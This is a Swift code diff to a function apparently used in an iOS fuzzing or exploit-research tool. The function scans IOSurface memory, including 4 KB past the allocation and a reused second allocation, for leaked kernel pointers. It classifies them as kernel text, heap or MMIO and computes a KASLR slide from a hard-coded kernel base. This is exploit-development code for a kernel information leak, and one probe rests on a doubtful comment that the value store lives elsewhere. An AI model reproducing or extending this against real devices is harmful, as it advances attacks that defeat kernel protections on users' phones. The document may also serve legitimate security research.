@@ -1762,41 +1762,57 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
         }
 
         surface.unlock(options: [], seed: nil)
-        step("GPU done, unlocked — scanning \(allocSize + 4096) bytes from baseAddress")
 
-        let raw     = baseAddr.assumingMemoryBound(to: UInt8.self)
-        let scanLen = allocSize + 4096
-        var found   = 0
-        for qw in 0..<(scanLen / 8) {
-            var val: UInt64 = 0
-            for b in 0..<8 { val |= UInt64(raw[qw*8 + b]) << (b*8) }
-            guard val != 0 && val != 0xFFFFFFFFFFFFFFFF else { continue }
-
-            let isKern = val >= 0xFFFFFE0000000000
-            let isGPU  = val >= 0x100000000 && !isKern
-            // Skip obvious pixel repeats (all same byte pattern in each byte)
-            let b0 = val & 0xFF
-            let allSame = (val == b0 &* 0x0101010101010101)
-            guard (isKern || isGPU) && !allSame else { continue }
-
-            let tag = isKern ? " *** KERNEL PTR" : " (gpu va)"
-            step("  ios[+0x\(String(qw*8, radix: 16))] = 0x\(String(val, radix: 16))\(tag)")
-            found += 1
-            if found >= 80 { step("  ...truncated at 80"); break }
-        }
-
-        if found == 0 {
-            step("  no VA-range values — scanning raw non-zero qwords (first 20):")
-            var raw2found = 0
-            for qw in 0..<(scanLen / 8) {
+        // Scan 1: pixel backing store + 4KB tail residue (allocator may not zero tail)
+        step("GPU done — scanning backing store (alloc=\(allocSize) + 4KB tail)")
+        func scanRegion(_ label: String, _ ptr: UnsafeRawPointer?, _ len: Int) {
+            guard let ptr = ptr, len >= 8 else { step("  \(label): nil/too small"); return }
+            let raw = ptr.assumingMemoryBound(to: UInt8.self)
+            var found = 0
+            var ktext = 0, kheap = 0, kmmio = 0
+            for qw in 0..<(len / 8) {
                 var val: UInt64 = 0
                 for b in 0..<8 { val |= UInt64(raw[qw*8 + b]) << (b*8) }
-                guard val != 0 && val != 0xFFFFFFFFFFFFFFFF else { continue }
-                step("  ios[+0x\(String(qw*8, radix: 16))] = 0x\(String(val, radix: 16))")
-                raw2found += 1
-                if raw2found >= 20 { break }
+                guard val >= 0xFFFFFE0000000000 && val != 0xFFFFFFFFFFFFFFFF else { continue }
+                let b0 = UInt8(val & 0xFF)
+                guard val != UInt64(b0) &* 0x0101010101010101 else { continue }
+                let unslidBase: UInt64 = 0xFFFFFFF007004000
+                let slide = val &- unslidBase
+                let cat: String
+                if val >= 0xFFFFFFF000000000 && val < 0xFFFFFFF080000000 && (val & 3) == 0 && slide <= 0x80000000 {
+                    cat = "KTEXT"; ktext += 1
+                } else if val < 0xFFFFFFF000000000 {
+                    cat = "KHEAP"; kheap += 1
+                } else {
+                    cat = "KMMIO"; kmmio += 1
+                }
+                step("  \(label)[+0x\(String(qw*8,radix:16))] = 0x\(String(val,radix:16)) [\(cat)]")
+                found += 1
+                if found >= 60 { step("  ...clipped at 60"); break }
             }
-            if raw2found == 0 { step("  truly all zero") }
+            step("  \(label) total: KTEXT=\(ktext) KHEAP=\(kheap) KMMIO=\(kmmio)")
+        }
+
+        scanRegion("pixel+tail", baseAddr, allocSize + 4096)
+
+        // Scan 2: probe IOSurface value store — get/set a value key to probe the scratch buffer
+        // IOSurface value dictionary writes to a separate kernel-mapped region
+        // After setting a value, the backing blob contains metadata we can read back
+        surface.setValue(NSNumber(value: 0xDEADBEEF as UInt32), forKey: "probe_key")
+        if let valBase = surface.baseAddress {
+            scanRegion("value_store", valBase, allocSize)
+        }
+
+        // Scan 3: create a second IOSurface that reuses allocator memory from the first
+        // Freed allocator chunks sometimes retain pointer residue from prior allocation
+        let props2: [IOSurfacePropertyKey: Any] = [
+            .width: 256, .height: 4, .bytesPerElement: 4, .bytesPerRow: 1024,
+            .pixelFormat: 0x42475241
+        ]
+        if let surf2 = IOSurface(properties: props2) {
+            surf2.lock(options: [], seed: nil)
+            surf2.unlock(options: [], seed: nil)
+            scanRegion("reuse_alloc", surf2.baseAddress, surf2.allocationSize + 4096)
         }
 
         step("── IOSurface Leak complete ─────────────────")
